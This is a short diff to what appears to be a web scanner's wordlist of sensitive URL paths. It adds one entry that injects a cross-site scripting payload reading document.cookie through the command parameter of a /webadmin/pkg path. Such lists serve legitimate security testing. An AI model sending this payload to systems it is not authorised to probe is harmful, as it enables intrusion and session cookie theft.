@@ -8175,3 +8175,4 @@ a
 /RPC2
 /_users/org.couchdb.user:poc
 /solr/admin/cores?wt=json
+/webadmin/pkg?command=<script>alert(document.cookie)</script>
